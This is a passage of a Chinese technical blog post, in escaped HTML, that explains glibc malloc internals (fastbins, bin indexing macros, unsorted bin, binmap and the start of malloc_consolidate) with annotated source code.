class=&#34;number&#34;&gt;0&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    set_head (remainder, remainder_size | PREV_INUSE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    set_foot (remainder, remainder_size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    check_malloc_chunk (av,mvictim,nb);		&lt;span class=&#34;comment&#34;&gt;//debug ТЌХућеТЮЦТБђТЪЦ chunk уіХТђЂ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *p = chunk2mem (victim);			&lt;span class=&#34;comment&#34;&gt;//УјитЙЌТїЄтљЉ user data уџёТїЄжњѕ№╝їУ┐ћтЏъу╗ЎућеТѕи&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// тдѓТъюУ«Йуй«С║є perturb_type№╝їт░є chunk уџё user data тѕЮтДІтїќСИ║ peerturb_type ^ 0xff&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    alloc_perturb (p,byte);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;2bin-уЏИтЁ│Т║љуаЂ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2bin-уЏИтЁ│Т║љуаЂ&#34;&gt;#&lt;/a&gt; 2.bin уЏИтЁ│Т║љуаЂ№╝џ&lt;/h2&gt;
&lt;h3 id=&#34;fastbin-уЏИтЁ│&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fastbin-уЏИтЁ│&#34;&gt;#&lt;/a&gt; fastbin уЏИтЁ│№╝џ&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// Та╣ТЇ«т║ЈтЈиУјитЈќ fastbinsY ТЋ░у╗ёСИГт»╣т║ћуџёbin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; fastbin(ar_ptr,idx) ((ar_ptr)-&amp;gt;fastbinsY[idx])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//Та╣ТЇ« chunk тцДт░ЈУјитЙЌСйЇуй«сђѓтЏаСИ║ MINSIZE СИ║ 0x20№╝їтЅЇСИцСИф index Тў»СИЇтЈ»у┤бт╝Ћуџё№╝їТЅђС╗ЦжюђУдЂтЄЈтј╗2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; fastbin_index(sz)	\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	((((unsigned int) (sz)) &amp;gt;&amp;gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// т«џС╣ЅС║єт▒ъС║ј fast_bin уџё chunk ТюђтцДтђ╝&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; MAX_FAST_SIZE (80 * SIZE_SZ / 4)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//т«џС╣ЅС║є fastbinsY ТЋ░у╗ёуџётцДт░Ј&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; NFASTBINS (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	fastbinsY ТЋ░у╗ёУхитДІт╣ХТ▓АТюЅС┐ЮтГўтц┤у╗Њуѓ╣№╝їУђїТў»тЈфС┐ЮтГўС║є malloc_chunk уџё fd ТѕљтЉў№╝їтЏаСИ║тЁХС╗ќТѕљтЉўт»╣С║јтЇЋжЊЙУАеу╗Њуѓ╣т╣ХТ▓АТюЅуће№╝їТЅђС╗Цт░▒уюЂуЋЦС║єсђѓтдѓСИІтЏЙТЅђуц║№╝їУ┐ЎС║Џ fd ТїЄжњѕуџётѕЮтДІтђ╝СИ║ NULL №╝їУАеуц║т»╣т║ћуџё bin СИ║уЕ║№╝їуЏ┤тѕ░ТюЅ chunk тіаУ┐ЏТЮЦТЌХ№╝їfd ТЅЇС┐ЮтГў chunk уџётю░тЮђсђѓ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/0c64e83715824b93b3e92b89e7b7f2b4.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;FASTBIN_CONSOLIDATION_THRESHOLD№╝їfastbin СИГуџё chunk СИђУѕгСИЇС╝џСИјтЁХС╗ќ chunk тљѕт╣ХсђѓСйєтдѓТъютљѕт╣ХС╣Ітљјуџё chunk тцДС║ј FASTBIN_CONSOLIDATION_THRESHOLD№╝їт░▒С╝џУДдтЈЉ malloc_consolidation () тЄйТЋ░№╝їт░є fastbin СИГуџё chunk СИјтЁХС╗ќ free chunk тљѕт╣Х№╝їуёХтљјуД╗тіетѕ░ unsorted bin СИГсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;fast bin СИГТюђтцДуџё chunk Тў»ућ▒ global_max_fast тє│т«џуџё№╝їУ┐ЎСИфтђ╝СИђУѕгтюетаєтѕЮтДІтїќуџёТЌХтђЎУ«Йуй«сђѓтйЊуёХтюеУ┐љУАїТЌХС╣ЪТў»тЈ»С╗ЦУ«Йуй«уџёсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; ser_max_fast(s)	\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	global_max_fast = (((s) == 0)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp;amp; ~MALLOC_ALIGN_MASK))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; get_max_fast()	global_max_fast	&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;bins-уЏИтЁ│&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bins-уЏИтЁ│&#34;&gt;#&lt;/a&gt; bins уЏИтЁ│№╝џ&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// С╗ј bins СИГУјитЈќТїЄт«џт║ЈтЈиуџё bin сђѓжюђУдЂТ│еТёЈ bin 0 Тў»СИЇтГўтюеуџё&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; bin_at(m,i)	\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	(mbinptr) (((char *) &amp;amp;((m)-&amp;gt;bins[((i) - 1) * 2]))				\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;			- offsetof (struct malloc_chunk,fd))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// УјитЙЌтйЊтЅЇ bin уџёСИіСИђСИф bin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; next_bin(b) ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &amp;lt;&amp;lt; 1)))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// СИђУѕгућеТЮЦУјитЙЌ bin СИГтц┤у╗Њуѓ╣ fd ТїЄтљЉуџё chunk ТѕќУђЁbk ТїЄтљЉуџё chunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; first(b)	((b)-&amp;gt;fd)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; last(b)		((b)-&amp;gt;bk)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	тЈ»С╗ЦуюІтѕ░ bin_at (m,i) т«Јт«џС╣ЅСИГтЄЈтј╗С║є offsetof (struct malloc_chunk,fd)№╝їС╣Ът░▒Тў» prev_size тњї size ТѕљтЉўуџётцДт░ЈсђѓУ┐ЎТў»тЏаСИ║ bins ТЋ░у╗ёт«ъжЎЁСИітЈфС┐ЮтГўС║єтЈїжЊЙУАеуџётц┤у╗Њуѓ╣уџё fd тњї bk ТїЄжњѕ№╝їтдѓСИІтЏЙ№╝џ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/9b48c38704a7434ab4c737ae86cb7720.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;p&gt;РђІ	bins [0] тњї bins [1] Тў» unsorted bin уџё fd тњї bk ТїЄжњѕ№╝їbinat (1) У┐ћтЏъуџёт║ћУ»ЦТў» unsorted bin уџётц┤ТїЄжњѕ№╝їСйєт«ъжЎЁСИітЁХТїЄтљЉуџёТў» bins [0] тю░тЮђтЄЈтј╗ offsetof (struct malloc_chunk,fd) уџёСйЇуй«№╝їУ┐ЎТаиСй┐ућетц┤у╗Њуѓ╣ТїЄжњѕ b ТЌХ№╝їb-&amp;gt;fd ТѕќУђЁ b-&amp;gt;bk УЃйтцЪТГБуА«У«┐жЌ«№╝їтљїТЌХ prev_size тњї size т»╣С║јтц┤у╗Њуѓ╣Т▓АТюЅТёЈС╣Ѕ№╝їТЅђС╗Цт░▒УбФуюЂуЋЦС║єсђѓт»╣С║ј binat (64) тЈіС╣Ітљјуџё large bin ТЮЦУ»┤№╝їтЏаСИ║тц┤у╗Њуѓ╣уџё size ТѕљтЉўТ▓АТюЅТёЈС╣Ѕ№╝їТЅђС╗ЦтЁХ fd_nextsize тњї bk_nextsize С╣ЪТў»Т▓АТюЅТёЈС╣Ѕуџё№╝їС╣ЪтЈ»С╗ЦуюЂуЋЦсђѓ&lt;/p&gt;
&lt;p&gt;РђІ	small bin тњї large bin у┤бт╝ЋтдѓСИІ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// Та╣ТЇ« chunk тцДт░ЈУјитЙЌтЁХтюе small bin СИГуџёу┤бт╝Ћ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; smallbin_index(sz)		\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &amp;gt;&amp;gt; 4) : (((unsigned) (sz)) &amp;gt;&amp;gt; 3))	\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	+ SMALLBIN_CORRECTION)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// Та╣ТЇ« chunk тцДт░ЈУјитЙЌтЁХтюе large bin СИГуџёу┤бт╝Ћ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; largebin_index(sz)		\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	(SIZE_SZ == 8 ? largebin_index_64 (sz)											\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	: MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)							\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;    : largebin_index_32 (sz))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// Та╣ТЇ« chunk тцДт░ЈУјитЙЌтЁХтюе bins СИГуџёу┤бт╝Ћ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; bin_index(sz)			\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	УјитЙЌ unsorted bin сђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; unsorted_chunk(M)		(bin_at (M,1))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	binmap у╗ЊТъётюеу┤бт╝Ћ bin уџёТЌХтђЎСй┐уће№╝їbinmap СИ║ malloc_state уџёТѕљтЉў№╝їтЁХСИГСИђСИфТ»ћуЅ╣СйЇУАеуц║ bins СИГуЏИт║ћуџё bin уіХТђЂ№╝ї1 УАеуц║ bin СИЇСИ║уЕ║№╝ї0 УАеуц║СИ║уЕ║№╝їУ┐ЎТаиУЃйтіат┐ФТљюу┤бжђЪт║дсђѓ&lt;/p&gt;
&lt;h2 id=&#34;3malloc_consolidateтЄйТЋ░&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3malloc_consolidateтЄйТЋ░&#34;&gt;#&lt;/a&gt; 3.malloc_consolidate () тЄйТЋ░№╝џ&lt;/h2&gt;
&lt;p&gt;РђІ	ућ▒С║ј fast bin СИГуџё chunk Т░ИУ┐юСИЇС╝џжЄіТћЙ№╝їт»╝УЄ┤уЏИжѓ╗уџё free chunk ТЌаТ│ЋСИјС╣Ітљѕт╣Х№╝їС╗јУђїжђаТѕљС║єтцДжЄЈуџётєЁтГўубјуЅЄ№╝їmalloc_consolidate () тЄйТЋ░СИ╗УдЂтіЪУЃйт░▒Тў»ТЮЦУДБтє│У┐ЎСИфжЌ«жбўсђѓтюеУЙЙтѕ░ТЪљС║ЏТЮАС╗ХТЌХ№╝їglibc т░▒С╝џУ░ЃућеУ»ЦтЄйТЋ░т░є  fast bin СИГуџё chunk тЈќтЄ║ТЮЦ№╝їСИјуЏИжѓ╗уџё free chunk тљѕт╣ХС╣ІтљјТћЙтЁЦ unsorted bin №╝їТѕќУђЁСИј top chunk тљѕт╣ХтљјтйбТѕљТќ░уџё top chunk сђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;malloc_consolidate&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(mstate av)&lt;/span&gt; 